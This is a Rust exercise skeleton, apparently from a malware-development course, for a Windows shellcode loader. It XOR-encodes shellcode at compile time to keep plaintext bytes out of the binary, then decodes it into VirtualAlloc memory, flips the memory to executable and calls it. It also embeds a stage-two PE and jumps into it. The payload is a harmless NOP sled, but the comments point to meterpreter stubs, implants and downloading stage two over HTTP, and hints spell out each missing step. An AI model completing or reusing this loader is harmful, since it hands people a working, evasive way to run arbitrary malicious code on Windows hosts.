use std::{mem, ptr};
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
    VirtualAlloc, VirtualFree, VirtualProtect,
};

// ── XOR key used for both compile-time encoding and runtime decoding ──────────
const KEY: &[u8] = b"maldev42";

// ── Part A: placeholder shellcode (NOP sled + INT3 breakpoint) ───────────────
// In a real scenario this would be your calc-shellcode or meterpreter stub.
// The const fn xor_encode() transforms it at compile time so the binary never
// contains the plaintext bytes.
const SHELLCODE: &[u8] = &[
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // NOP sled
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xCC, // INT3 — debugger breakpoint
];

// Compile-time XOR encoder — rolling key, result stored in BSS instead of text.
// The same function is used at runtime to decode (XOR is its own inverse).
const fn xor_encode(input: &[u8], key: &[u8]) -> [u8; 64] {
    todo!("implement: iterate input, XOR each byte with key[i % key.len()], return [u8; 64]")
}

// The encoded shellcode lives in the binary; plaintext bytes are never present.
static ENCODED_SHELLCODE: [u8; 64] = xor_encode(SHELLCODE, KEY);

// ── Part B: embedded stage-two PE ────────────────────────────────────────────
// Build 13-stage-two first:
//   cargo build --target x86_64-pc-windows-gnu -p stage-two
//   cargo build --target x86_64-pc-windows-gnu -p payload-staging
const STAGE_TWO: &[u8] = include_bytes!(
    "../../target/x86_64-pc-windows-gnu/debug/stage_two.exe"
);

fn main() {
    unsafe {
        // ── PART A: XOR decode + execute shellcode ────────────────────────────

        // Step 1 — Allocate RW memory for the decoded shellcode.
        // Start with PAGE_READWRITE so we can copy bytes in safely.
        // PAGE_EXECUTE_* is only needed after the copy is complete.
        //
        // Hint: VirtualAlloc(
        //     lpaddress: Option<*const c_void>,          // None — let the OS choose
        //     dwsize: usize,                             // ENCODED_SHELLCODE.len()
        //     flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
        //     flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_READWRITE
        // ) -> *mut c_void                               // NULL on failure
        let buf: *mut u8 = todo!("VirtualAlloc(None, shellcode_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) cast to *mut u8");
        if buf.is_null() {
            panic!("VirtualAlloc (shellcode) failed: {:?}", GetLastError());
        }

        // Step 2 — XOR-decode ENCODED_SHELLCODE into the allocation.
        // Iterate over each byte, XOR with key[i % KEY.len()], write to buf.
        //
        // Hint: use ptr::write(buf.add(i), ENCODED_SHELLCODE[i] ^ KEY[i % KEY.len()])
        //       inside a for loop over 0..ENCODED_SHELLCODE.len()
        todo!("decode ENCODED_SHELLCODE into buf using rolling XOR with KEY");

        // Step 3 — Change the allocation from RW to RX.
        // W^X: the allocation must not be writable while executing.
        // VirtualProtect changes the protection on an existing committed region.
        //
        // Hint: VirtualProtect(
        //     lpaddress: *const c_void,              // buf as *const c_void
        //     dwsize: usize,                         // ENCODED_SHELLCODE.len()
        //     flnewprotect: PAGE_PROTECTION_FLAGS,   // PAGE_EXECUTE_READ
        //     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // &mut old_protect — receives the previous protection
        // ) -> Result<()>
        let mut old_protect = PAGE_READWRITE;
        todo!("VirtualProtect(buf, shellcode_len, PAGE_EXECUTE_READ, &mut old_protect)").unwrap();

        // Step 4 — Execute the shellcode.
        // Transmute the buffer pointer to a function pointer and call it.
        // The shellcode above is a NOP sled ending in INT3 — attach a debugger to
        // observe execution, or swap in real shellcode that spawns calc.exe.
        //
        // Hint: let f: unsafe extern "system" fn() = mem::transmute(buf);
        //       f();
        todo!("transmute buf to fn pointer and call it");

        // Clean up Part A allocation (optional in a real implant, good practice here).
        VirtualFree(buf as *mut _, 0, MEM_RELEASE).ok();

        // ── PART B: embed and jump into a stage-two PE ────────────────────────
        // NOTE: running a full PE from a raw VirtualAlloc region (without PE loading)
        // is NOT reliable — the PE's import table is not resolved and relocations are
        // not applied. This exercise is intentionally simplified so you can observe
        // the memory pattern. Reliable PE execution needs the hollowing approach from
        // Module 04 or the reflective loader from Module 07.
        //
        // In a real staged payload you would:
        //   1. Download the stage-two PE from an HTTP server (Module 25).
        //   2. Reflectively load it (Module 07 / Module 26).
        // Here we embed it statically and jump directly to exercise the alloc+copy pattern.

        // Step 5 — Allocate RWX memory for the stage-two PE bytes.
        //
        // Hint: VirtualAlloc(None, STAGE_TWO.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        //       cast the result to *mut u8; check for null
        let stage_buf: *mut u8 = todo!("VirtualAlloc for STAGE_TWO.len() bytes, PAGE_EXECUTE_READWRITE");
        if stage_buf.is_null() {
            panic!("VirtualAlloc (stage-two) failed: {:?}", GetLastError());
        }

        // Step 6 — Copy the stage-two PE bytes into the allocation.
        //
        // Hint: ptr::copy_nonoverlapping(
        //     src: *const u8,   // STAGE_TWO.as_ptr()
        //     dst: *mut u8,     // stage_buf
        //     count: usize,     // STAGE_TWO.len()
        // )
        todo!("ptr::copy_nonoverlapping(STAGE_TWO.as_ptr(), stage_buf, STAGE_TWO.len())");

        // Step 7 — Transmute and call.
        // This is the "jump to PE entry point" pattern. It will crash or misbehave
        // because the PE is not properly loaded, but it demonstrates the concept.
        // Replace with Module 04's hollowing or Module 07's reflective loader for
        // reliable execution.
        //
        // Hint: let f: unsafe extern "system" fn() = mem::transmute(stage_buf);
        //       f();
        todo!("transmute stage_buf to fn pointer and call it");
    }
}
